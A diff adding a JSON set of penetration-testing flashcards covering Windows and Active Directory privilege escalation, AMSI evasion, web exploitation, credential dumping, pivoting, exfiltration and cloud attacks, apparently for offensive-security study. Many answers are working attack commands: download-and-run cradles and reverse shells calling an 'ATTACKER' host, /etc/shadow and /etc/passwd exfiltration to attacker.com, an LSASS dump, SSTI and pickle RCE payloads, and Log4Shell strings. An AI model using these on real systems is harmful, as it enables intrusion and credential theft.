@@ -1,0 +1,652 @@
+[
+  {
+    "module_id": 38,
+    "question": "What privilege enables Potato attacks (GodPotato/PrintSpoofer)?",
+    "answer": "SeImpersonatePrivilege — check with whoami /priv"
+  },
+  {
+    "module_id": 38,
+    "question": "What command finds unquoted service paths via wmic?",
+    "answer": "wmic service get name,pathname | findstr /i \"auto\" | findstr /i /v \"C:\\\\Windows\""
+  },
+  {
+    "module_id": 38,
+    "question": "Both AlwaysInstallElevated registry keys must be set to what value?",
+    "answer": "1 — both HKCU and HKLM must equal 1; either alone is not exploitable"
+  },
+  {
+    "module_id": 38,
+    "question": "Which tool provides the most comprehensive Windows privesc enumeration output?",
+    "answer": "winPEAS — colour-coded output: red = high priority, yellow = worth investigating"
+  },
+  {
+    "module_id": 38,
+    "question": "How do you generate an MSI payload for AlwaysInstallElevated exploitation?",
+    "answer": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi -o evil.msi"
+  },
+  {
+    "module_id": 38,
+    "question": "What does cmdkey /list reveal?",
+    "answer": "Stored Windows credentials — often domain accounts saved for mapped drives or scheduled tasks"
+  },
+  {
+    "module_id": 38,
+    "question": "What file commonly contains cleartext credentials left from Windows deployment?",
+    "answer": "C:\\Windows\\Panther\\Unattend.xml — contains admin passwords from autounattend setup"
+  },
+  {
+    "module_id": 38,
+    "question": "Which privilege allows reading any file on the system regardless of ACLs?",
+    "answer": "SeBackupPrivilege — designed for backup software, abusable to read SAM/SYSTEM hives"
+  },
+  {
+    "module_id": 38,
+    "question": "GodPotato works on which Windows versions?",
+    "answer": "Windows 10, Windows 11, Windows Server 2022 — uses COM server token impersonation"
+  },
+  {
+    "module_id": 38,
+    "question": "What command runs PowerUp's all-in-one check in memory?",
+    "answer": "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks"
+  },
+  {
+    "module_id": 39,
+    "question": "What is a Golden Ticket and how long is it valid?",
+    "answer": "A forged TGT signed with the krbtgt NTLM hash — valid up to 10 years by default"
+  },
+  {
+    "module_id": 39,
+    "question": "Why must krbtgt be reset TWICE to invalidate Golden Tickets?",
+    "answer": "KDCs accept tickets signed by either the current or previous krbtgt key — two resets invalidate both"
+  },
+  {
+    "module_id": 39,
+    "question": "What ADCS misconfiguration does ESC1 exploit?",
+    "answer": "Template allows requestor-specified SAN + Domain Authentication EKU + low-privilege enrollment"
+  },
+  {
+    "module_id": 39,
+    "question": "Which impacket tool fully automates child-domain to root-domain escalation?",
+    "answer": "impacket-raiseChild child.corp.local/admin:pass -target-exec rootdc.corp.local"
+  },
+  {
+    "module_id": 39,
+    "question": "What certipy command finds vulnerable ADCS templates?",
+    "answer": "certipy find -u user@corp.local -p pass -dc-ip DC_IP -vulnerable"
+  },
+  {
+    "module_id": 39,
+    "question": "What attribute does Shadow Credentials abuse?",
+    "answer": "msDS-KeyCredentialLink — allows injecting a certificate key credential for PKINIT authentication"
+  },
+  {
+    "module_id": 39,
+    "question": "What permissions on a computer object enable RBCD abuse?",
+    "answer": "GenericWrite on the target computer object — allows setting msDS-AllowedToActOnBehalfOfOtherIdentity"
+  },
+  {
+    "module_id": 39,
+    "question": "Where does a Silver Ticket differ from a Golden Ticket in terms of logging?",
+    "answer": "Silver Tickets bypass the KDC entirely — no Event 4768 on the DC. Golden Tickets generate KDC events"
+  },
+  {
+    "module_id": 39,
+    "question": "What SID must be added in ExtraSIDs for child-to-parent escalation?",
+    "answer": "S-1-5-21-[ROOT_DOMAIN_SID]-519 — the Enterprise Admins group SID of the root domain"
+  },
+  {
+    "module_id": 39,
+    "question": "Which BloodHound edge reveals DCSync rights on the domain object?",
+    "answer": "GetChanges + GetChangesAll edges from a principal to the domain node indicate DCSync capability"
+  },
+  {
+    "module_id": 40,
+    "question": "What does AMSI stand for and which runtimes does it hook?",
+    "answer": "Antimalware Scan Interface — hooks PowerShell, .NET, JScript, VBScript before execution"
+  },
+  {
+    "module_id": 40,
+    "question": "What field must be set to true to disable AMSI in a PowerShell session?",
+    "answer": "amsiInitFailed field in System.Management.Automation.AmsiUtils (set via reflection)"
+  },
+  {
+    "module_id": 40,
+    "question": "What LOLBin downloads files from a URL to disk?",
+    "answer": "certutil.exe -urlcache -split -f http://ATTACKER/file.exe output.exe"
+  },
+  {
+    "module_id": 40,
+    "question": "Which PowerShell command mode must you check before using .NET reflection?",
+    "answer": "$ExecutionContext.SessionState.LanguageMode — ConstrainedLanguage blocks reflection and Add-Type"
+  },
+  {
+    "module_id": 40,
+    "question": "What command executes a remote PowerShell script entirely in memory?",
+    "answer": "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"
+  },
+  {
+    "module_id": 40,
+    "question": "What does ETW patching accomplish?",
+    "answer": "Disables Event Tracing for Windows so PowerShell script block logging and ETW-based EDR telemetry stops recording events"
+  },
+  {
+    "module_id": 40,
+    "question": "What mshta command executes a remote HTA payload?",
+    "answer": "mshta.exe http://ATTACKER/payload.hta — runs VBScript/JScript as a trusted Windows binary"
+  },
+  {
+    "module_id": 40,
+    "question": "Why is Shikata Ga Nai (SGN) encoding no longer effective?",
+    "answer": "AV vendors have fully signatured SGN. Use custom C# droppers, in-memory shellcode loaders, or DONUT instead"
+  },
+  {
+    "module_id": 40,
+    "question": "What regsvr32 command executes a remote scriptlet without touching disk?",
+    "answer": "regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll"
+  },
+  {
+    "module_id": 40,
+    "question": "If Constrained Language Mode is active, what alternative execution paths exist?",
+    "answer": "PowerShell v2 (no CLM), cmd.exe with LOLBins, compiled C# EXE, MSBuild inline tasks, regsvr32/mshta"
+  },
+  {
+    "module_id": 41,
+    "question": "What is the AWS IMDS endpoint and what does successful SSRF to it yield?",
+    "answer": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ — returns temporary IAM role credentials"
+  },
+  {
+    "module_id": 41,
+    "question": "What does {{7*7}} returning 49 confirm in a web application?",
+    "answer": "Server-Side Template Injection (SSTI) — typically Jinja2 or Twig template engine"
+  },
+  {
+    "module_id": 41,
+    "question": "What ysoserial gadget chain is safe to use for blind deserialization detection?",
+    "answer": "URLDNS — triggers a DNS callback only, no side effects, no classpath dependency"
+  },
+  {
+    "module_id": 41,
+    "question": "What numeric representation of 127.0.0.1 bypasses SSRF IP filters?",
+    "answer": "2130706433 (decimal) — http://2130706433/ resolves to 127.0.0.1"
+  },
+  {
+    "module_id": 41,
+    "question": "How does the JWT RS256-to-HS256 algorithm confusion attack work?",
+    "answer": "Change alg to HS256, sign with the server's public RSA key — vulnerable libraries treat it as the HMAC secret"
+  },
+  {
+    "module_id": 41,
+    "question": "What Jinja2 payload achieves RCE via os.popen?",
+    "answer": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+  },
+  {
+    "module_id": 41,
+    "question": "What does mass assignment exploit in web frameworks?",
+    "answer": "Automatic binding of HTTP request parameters to object properties, including privileged fields like role or isAdmin"
+  },
+  {
+    "module_id": 41,
+    "question": "Which SSRF protocol can attack Redis and SMTP internally?",
+    "answer": "gopher:// — allows sending raw TCP payloads to internal services via SSRF"
+  },
+  {
+    "module_id": 41,
+    "question": "What Python code creates a malicious pickle payload for RCE?",
+    "answer": "class E: def __reduce__(self): return (os.system, ('id',)); pickle.dumps(E())"
+  },
+  {
+    "module_id": 41,
+    "question": "What Burp Suite extension automates JWT testing?",
+    "answer": "JWT Editor — allows decoding, modifying, alg confusion, and alg:none attacks interactively"
+  },
+  {
+    "module_id": 42,
+    "question": "What endpoint reveals the full GraphQL schema including all types and fields?",
+    "answer": "POST /graphql with body: {\"query\":\"{ __schema { types { name fields { name } } } }\"}"
+  },
+  {
+    "module_id": 42,
+    "question": "What is BOLA and what is the simplest way to prove it?",
+    "answer": "Broken Object Level Authorization — create two accounts, access account B's resource while authenticated as account A"
+  },
+  {
+    "module_id": 42,
+    "question": "Which HTTP header tricks can bypass API rate limiting based on IP?",
+    "answer": "X-Forwarded-For, X-Real-IP, True-Client-IP set to 127.0.0.1 or other IPs"
+  },
+  {
+    "module_id": 42,
+    "question": "Where do you locate API endpoint lists hidden in JavaScript?",
+    "answer": "Search .js files for fetch(), axios(), endpoint strings, and /api/ paths — Burp JS parser automates this"
+  },
+  {
+    "module_id": 42,
+    "question": "What is mass assignment and which HTTP methods are most vulnerable?",
+    "answer": "Sending extra properties not intended for user modification — PUT and PATCH are most commonly vulnerable"
+  },
+  {
+    "module_id": 42,
+    "question": "What ffuf wordlist is purpose-built for API endpoint discovery?",
+    "answer": "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
+  },
+  {
+    "module_id": 42,
+    "question": "How do GraphQL batching attacks bypass rate limiting?",
+    "answer": "Multiple queries sent in one HTTP request as a JSON array — rate limit counts requests not queries"
+  },
+  {
+    "module_id": 42,
+    "question": "What information does an API swagger.json file expose?",
+    "answer": "Every endpoint path, HTTP methods, parameters, request/response schemas, authentication requirements, and descriptions"
+  },
+  {
+    "module_id": 42,
+    "question": "What is Broken Function Level Authorization in REST APIs?",
+    "answer": "Admin functions accessible to regular users when tested directly — e.g., DELETE /api/users/{id} accessible without admin role"
+  },
+  {
+    "module_id": 42,
+    "question": "How do you test if an API ignores Verb Tampering restrictions?",
+    "answer": "Send OPTIONS to see allowed methods, then test each — a GET-restricted resource may allow DELETE"
+  },
+  {
+    "module_id": 43,
+    "question": "What default trust property between AD child and parent domains enables SID injection?",
+    "answer": "SID Filtering is disabled by default within the same forest — child can inject ExtraSIDs into cross-realm tickets"
+  },
+  {
+    "module_id": 43,
+    "question": "Which Enterprise group SID grants full root domain access via Golden Ticket ExtraSIDs?",
+    "answer": "S-1-5-21-[ROOT_DOMAIN_SID]-519 — Enterprise Admins group of the root domain"
+  },
+  {
+    "module_id": 43,
+    "question": "What two tools are needed for Unconstrained Delegation + coercion attacks?",
+    "answer": "SpoolSample.exe (or PetitPotam) for coercion + Rubeus.exe for TGT extraction from compromised host"
+  },
+  {
+    "module_id": 43,
+    "question": "What attribute on a computer object enables Constrained Delegation abuse?",
+    "answer": "msDS-AllowedToDelegateTo — lists specific services the account can delegate to using S4U2Proxy"
+  },
+  {
+    "module_id": 43,
+    "question": "What permission enables RBCD configuration on a target computer?",
+    "answer": "GenericWrite on the target computer object — allows setting msDS-AllowedToActOnBehalfOfOtherIdentity"
+  },
+  {
+    "module_id": 43,
+    "question": "How does impacket-raiseChild automate child-to-root escalation?",
+    "answer": "It DCsyncs child krbtgt, forges Golden Ticket with Enterprise Admin SID, authenticates to root DC, and secredtsumps in one command"
+  },
+  {
+    "module_id": 43,
+    "question": "What PowerView command maps all trust relationships in the forest?",
+    "answer": "Get-DomainTrustMapping — shows all trusts, direction, type, and transitivity"
+  },
+  {
+    "module_id": 43,
+    "question": "What limits cross-forest trust attacks when Selective Authentication is enabled?",
+    "answer": "Only explicitly permitted users can authenticate across the forest trust — others are denied"
+  },
+  {
+    "module_id": 43,
+    "question": "What Rubeus command performs S4U delegation to impersonate administrator to a service?",
+    "answer": "Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/server.corp.local /ptt"
+  },
+  {
+    "module_id": 43,
+    "question": "What is the default ms-DS-MachineAccountQuota value and why does it matter for RBCD?",
+    "answer": "10 — any domain user can create up to 10 computer accounts by default, used as the controlled principal in RBCD"
+  },
+  {
+    "module_id": 44,
+    "question": "What rundll32 command dumps LSASS memory without Mimikatz?",
+    "answer": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump [LSASS_PID] C:\\Temp\\lsass.dmp full"
+  },
+  {
+    "module_id": 44,
+    "question": "What Linux tool parses an LSASS minidump offline?",
+    "answer": "pypykatz lsa minidump lsass.dmp"
+  },
+  {
+    "module_id": 44,
+    "question": "What three hives must be exported to get both local and domain cached hashes?",
+    "answer": "HKLM\\SAM, HKLM\\SYSTEM, HKLM\\SECURITY — SAM+SYSTEM for local hashes, SECURITY for LSA/domain cached"
+  },
+  {
+    "module_id": 44,
+    "question": "What Windows feature blocks Mimikatz from extracting credentials from LSASS?",
+    "answer": "Credential Guard — isolates LSASS in a VBS hypervisor enclave inaccessible even to SYSTEM"
+  },
+  {
+    "module_id": 44,
+    "question": "Which tool collects credentials from 30+ sources including browsers and SSH keys?",
+    "answer": "LaZagne.exe all — harvests from browsers, email, SSH, VPN, database clients, and more"
+  },
+  {
+    "module_id": 44,
+    "question": "What WMI persistence method is most resilient and hardest to detect?",
+    "answer": "WMI Event Subscription using EventFilter + CommandLineEventConsumer + FilterToConsumerBinding"
+  },
+  {
+    "module_id": 44,
+    "question": "What registry path persists a program for all users at logon?",
+    "answer": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run [value] = C:\\path\\to\\binary.exe"
+  },
+  {
+    "module_id": 44,
+    "question": "What privilege allows LSASS access for memory reading?",
+    "answer": "SeDebugPrivilege — held by local administrators by default, needed for LSASS access"
+  },
+  {
+    "module_id": 44,
+    "question": "What impacket command parses offline SAM/SYSTEM hives for NT hashes?",
+    "answer": "impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL"
+  },
+  {
+    "module_id": 44,
+    "question": "What schtasks command creates a SYSTEM-level scheduled task persistence?",
+    "answer": "schtasks /create /tn \"TaskName\" /tr \"C:\\evil.exe\" /sc onstart /ru SYSTEM /f"
+  },
+  {
+    "module_id": 45,
+    "question": "What nxc flag is required when using local administrator hashes instead of domain hashes?",
+    "answer": "--local-auth — without it, nxc tries domain authentication which fails for local accounts"
+  },
+  {
+    "module_id": 45,
+    "question": "What does (Pwn3d!) mean in nxc SMB output?",
+    "answer": "The provided credentials have local administrator access on that host"
+  },
+  {
+    "module_id": 45,
+    "question": "Which impacket execution method has the lowest detection profile?",
+    "answer": "wmiexec — uses DCOM/WMI, creates no service, drops no executable"
+  },
+  {
+    "module_id": 45,
+    "question": "What is Overpass-the-Hash?",
+    "answer": "Converting an NTLM hash into a Kerberos TGT — allows using hash in Kerberos-only environments: Rubeus.exe asktgt /user:x /rc4:HASH"
+  },
+  {
+    "module_id": 45,
+    "question": "What Kerberos mechanism makes lateral movement with tickets time-sensitive?",
+    "answer": "TGT 10-hour maximum lifetime — tickets expire and must be re-requested for continued lateral movement"
+  },
+  {
+    "module_id": 45,
+    "question": "Why does Pass-the-Hash fail over RDP by default?",
+    "answer": "RDP requires full NTLMv2 authentication; Restricted Admin mode must be enabled to allow PTH via RDP"
+  },
+  {
+    "module_id": 45,
+    "question": "What BloodHound query finds the shortest attack path to Domain Admins?",
+    "answer": "MATCH p=shortestPath((n {owned:true})-[*]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p"
+  },
+  {
+    "module_id": 45,
+    "question": "What nxc command dumps local SAM hashes from a remote host?",
+    "answer": "nxc smb TARGET -u admin -H NTLM_HASH --sam"
+  },
+  {
+    "module_id": 45,
+    "question": "What event ID on the target host indicates a successful lateral movement logon?",
+    "answer": "Event 4624 (successful logon) — all lateral movement techniques generate this on the target"
+  },
+  {
+    "module_id": 45,
+    "question": "How does evil-winrm authenticate using a hash instead of a password?",
+    "answer": "evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH"
+  },
+  {
+    "module_id": 46,
+    "question": "What Linux kernel interface does Ligolo-ng create to enable transparent routing?",
+    "answer": "TUN interface (ligolo) — sudo ip tuntap add user kali mode tun ligolo"
+  },
+  {
+    "module_id": 46,
+    "question": "What route command makes an internal subnet reachable through Ligolo?",
+    "answer": "sudo ip route add 10.10.10.0/24 dev ligolo (after tunnel is started in proxy console)"
+  },
+  {
+    "module_id": 46,
+    "question": "Why can't proxychains be used with UDP-based nmap scans?",
+    "answer": "Proxychains proxies TCP only — use -sT (TCP connect) and -Pn with nmap through proxies"
+  },
+  {
+    "module_id": 46,
+    "question": "What Chisel command on the victim creates a reverse SOCKS5 proxy to the attacker?",
+    "answer": ".\\chisel.exe client ATTACKER:8080 R:socks"
+  },
+  {
+    "module_id": 46,
+    "question": "What proxychains.conf entry must be added for Chisel SOCKS5?",
+    "answer": "socks5 127.0.0.1 1080 (replacing existing socks4 127.0.0.1 9050 entry)"
+  },
+  {
+    "module_id": 46,
+    "question": "What SSH flag creates a dynamic SOCKS proxy for pivoting?",
+    "answer": "ssh -D 9050 -N -f user@pivot_host — creates SOCKS5 proxy on local port 9050"
+  },
+  {
+    "module_id": 46,
+    "question": "What ports should Chisel/Ligolo use to blend with normal egress traffic?",
+    "answer": "Port 80 (HTTP) or 443 (HTTPS) to blend with allowed firewalls egress rules"
+  },
+  {
+    "module_id": 46,
+    "question": "What is dnscat2 used for and when is it necessary?",
+    "answer": "C2 over DNS — used when only port 53 UDP outbound allowed; very low bandwidth but bypasses strict firewalls"
+  },
+  {
+    "module_id": 46,
+    "question": "How do you verify a pivot tunnel works before running full scans?",
+    "answer": "proxychains curl http://INTERNAL_IP/ or proxychains nc -zv INTERNAL_IP PORT — confirm TCP connectivity first"
+  },
+  {
+    "module_id": 46,
+    "question": "What is the correct agent command to connect back to a Ligolo proxy?",
+    "answer": ".\\agent.exe -connect ATTACKER_IP:11601 -ignore-cert"
+  },
+  {
+    "module_id": 47,
+    "question": "What colour code in Snaffler output indicates the highest priority files?",
+    "answer": "Red — critical files like KeePass databases (.kdbx), private keys (.ppk, .pfx), and exposed credential files"
+  },
+  {
+    "module_id": 47,
+    "question": "What file types does Snaffler prioritise as Red findings?",
+    "answer": "KeePass .kdbx, PuTTY .ppk, certificates .pfx, files matching credential patterns in config/ini/xml"
+  },
+  {
+    "module_id": 47,
+    "question": "What is the correct ethical stance when finding PII during data exfiltration testing?",
+    "answer": "Screenshot the file listing and first line to prove access — do NOT download or retain actual PII/financial data"
+  },
+  {
+    "module_id": 47,
+    "question": "What curl command exfiltrates a file via HTTP POST to attacker?",
+    "answer": "curl -X POST http://ATTACKER:8080/recv -F \"file=@/etc/shadow\""
+  },
+  {
+    "module_id": 47,
+    "question": "What DNS exfiltration command encodes /etc/passwd and sends via DNS queries?",
+    "answer": "for chunk in $(cat /etc/passwd | base64 | fold -w 50); do dig @attacker.com ${chunk}.ex.attacker.com; done"
+  },
+  {
+    "module_id": 47,
+    "question": "What Linux grep command finds PHP files containing passwords recursively?",
+    "answer": "grep -r -i \"password\" /var/www --include=\"*.php\" 2>/dev/null"
+  },
+  {
+    "module_id": 47,
+    "question": "What impacket command creates an SMB share for file collection?",
+    "answer": "impacket-smbserver share /tmp/loot -smb2support — then: copy target C:\\\\ATTACKER_IP\\share"
+  },
+  {
+    "module_id": 47,
+    "question": "What MSSQL feature enables OS command execution and what SQL enables it?",
+    "answer": "xp_cmdshell — EXEC xp_cmdshell 'whoami'; (requires sysadmin or CONTROL SERVER)"
+  },
+  {
+    "module_id": 47,
+    "question": "What Windows PowerShell command recursively finds config files containing 'password'?",
+    "answer": "Get-ChildItem -Path C:\\ -Include *.config,*.ini,*.xml -Recurse -EA SilentlyContinue | Select-String 'password'"
+  },
+  {
+    "module_id": 47,
+    "question": "What does DLP (Data Loss Prevention) typically use to detect exfiltration?",
+    "answer": "Pattern matching for PII formats (credit card, SSN, NHS numbers) — base64 or encryption bypasses pattern detection"
+  },
+  {
+    "module_id": 48,
+    "question": "What is the AWS IMDSv2 flow and why was it introduced?",
+    "answer": "IMDSv2 requires a PUT request for a session token before GET requests to metadata — prevents SSRF from directly fetching credentials"
+  },
+  {
+    "module_id": 48,
+    "question": "What aws-cli command confirms that stolen IAM credentials are valid?",
+    "answer": "aws sts get-caller-identity — returns AccountId, UserId, ARN if credentials work"
+  },
+  {
+    "module_id": 48,
+    "question": "What makes an S3 bucket world-readable?",
+    "answer": "ACL grants s3:GetObject to AllUsers, or bucket policy allows public access, with Block Public Access disabled"
+  },
+  {
+    "module_id": 48,
+    "question": "What aws-cli flag lists an S3 bucket without any authentication?",
+    "answer": "--no-sign-request — tests for public/anonymous bucket access without credentials"
+  },
+  {
+    "module_id": 48,
+    "question": "What ScoutSuite command audits an AWS account for misconfigurations?",
+    "answer": "python3 scout.py aws --report-dir ./scout-report (requires configured aws-cli credentials)"
+  },
+  {
+    "module_id": 48,
+    "question": "What AWS IAM combination allows escalation to any role?",
+    "answer": "iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction — create lambda with admin role and invoke"
+  },
+  {
+    "module_id": 48,
+    "question": "What AWS metadata path often contains credentials in startup scripts?",
+    "answer": "http://169.254.169.254/latest/user-data/ — startup scripts frequently embed SSH keys or credentials"
+  },
+  {
+    "module_id": 48,
+    "question": "What AWS service stores application secrets and should always be enumerated?",
+    "answer": "AWS Secrets Manager — aws secretsmanager list-secrets; aws secretsmanager get-secret-value --secret-id NAME"
+  },
+  {
+    "module_id": 48,
+    "question": "What does a Security Group with 0.0.0.0/0 on port 3306 indicate?",
+    "answer": "MySQL is exposed to the entire internet — critical misconfiguration, immediate unauthenticated access testing required"
+  },
+  {
+    "module_id": 48,
+    "question": "What GCP/AWS metadata header does IMDSv2 require to prevent SSRF metadata theft?",
+    "answer": "X-aws-ec2-metadata-token — PUT to /latest/api/token to get token, include in subsequent GET requests"
+  },
+  {
+    "module_id": 49,
+    "question": "What tool deobfuscates .NET assemblies before analysis in dnSpy?",
+    "answer": "de4dot.exe — run de4dot.exe obfuscated.exe -o cleaned.exe before opening in dnSpy"
+  },
+  {
+    "module_id": 49,
+    "question": "What dnSpy shortcut searches all strings in a .NET binary?",
+    "answer": "Ctrl+F (Search All) — search for strings like password, apikey, secret, connection in all types"
+  },
+  {
+    "module_id": 49,
+    "question": "How do you install Burp Suite CA for a thick client using WinHTTP?",
+    "answer": "Import Burp CA into Windows system store via certmgr.msc -> Trusted Root Certification Authorities -> Import"
+  },
+  {
+    "module_id": 49,
+    "question": "What Procmon filter reveals DLL hijacking opportunities in a thick client?",
+    "answer": "Result = NAME NOT FOUND + Path ends with .dll — shows missing DLLs searched in app's directory"
+  },
+  {
+    "module_id": 49,
+    "question": "What tool routes all Windows thick client traffic through Burp Suite?",
+    "answer": "ProxyCap or Proxifier — redirects all TCP traffic from the application process to 127.0.0.1:8080"
+  },
+  {
+    "module_id": 49,
+    "question": "What .NET code pattern indicates SSL certificate validation is disabled?",
+    "answer": "ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, err) => true"
+  },
+  {
+    "module_id": 49,
+    "question": "What command decompiles a Java thick client JAR for source analysis?",
+    "answer": "jadx -d output_dir application.jar — produces Java source for all classes"
+  },
+  {
+    "module_id": 49,
+    "question": "Where do thick clients commonly store SQLite credential databases on Windows?",
+    "answer": "%AppData%\\AppName\\ and %LocalAppData%\\AppName\\ — search: dir /s /b %AppData% | findstr .db"
+  },
+  {
+    "module_id": 49,
+    "question": "What msfvenom format creates a DLL for hijacking attacks?",
+    "answer": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o hijack.dll"
+  },
+  {
+    "module_id": 49,
+    "question": "What strings command quickly finds potential credentials in any binary?",
+    "answer": "strings application.exe | grep -i -E \"pass|key|secret|cred|token|api\""
+  },
+  {
+    "module_id": 50,
+    "question": "What searchsploit flag lets you read an exploit without copying it?",
+    "answer": "searchsploit -x PATH — examines the exploit source inline; use -m to copy to current directory"
+  },
+  {
+    "module_id": 50,
+    "question": "Log4Shell affects which Log4j versions?",
+    "answer": "Log4j 2.0 through 2.14.1 — fixed in 2.15.0 (CVE-2021-44228)"
+  },
+  {
+    "module_id": 50,
+    "question": "What is the minimal Log4Shell test payload to confirm the vulnerability?",
+    "answer": "${jndi:ldap://ATTACKER_COLLABORATOR:1389/test} — injected in User-Agent, X-Api-Version, or any logged header"
+  },
+  {
+    "module_id": 50,
+    "question": "What nmap script confirms MS17-010 (EternalBlue) vulnerability?",
+    "answer": "nmap -p 445 --script smb-vuln-ms17-010 TARGET — returns VULNERABLE if unpatched SMBv1"
+  },
+  {
+    "module_id": 50,
+    "question": "What Windows versions are vulnerable to EternalBlue?",
+    "answer": "Unpatched Windows 7 SP1 and Windows Server 2008 R2 — patch MS17-010 closes it"
+  },
+  {
+    "module_id": 50,
+    "question": "What Shellshock test payload reads /etc/passwd via CGI?",
+    "answer": "curl -A '() { :;}; echo; cat /etc/passwd' http://target.com/cgi-bin/test.cgi"
+  },
+  {
+    "module_id": 50,
+    "question": "What does the ysoserial URLDNS gadget do when triggered?",
+    "answer": "Makes a DNS lookup to the attacker-controlled domain — confirms deserialization without executing OS commands"
+  },
+  {
+    "module_id": 50,
+    "question": "What Log4Shell bypass technique works against WAFs filtering the standard payload?",
+    "answer": "${${lower:j}ndi:${lower:l}${lower:d}${lower:a}${lower:p}://ATTACKER:1389/test} — case transformation bypasses string matching"
+  },
+  {
+    "module_id": 50,
+    "question": "What searchsploit command updates the local Exploit-DB mirror?",
+    "answer": "searchsploit --update"
+  },
+  {
+    "module_id": 50,
+    "question": "What six elements should every CVE exploitation finding include in a report?",
+    "answer": "1) CVE ID and title 2) Affected version 3) Vulnerability description 4) Evidence (command + output) 5) Impact 6) Remediation recommendation"
+  }
+]
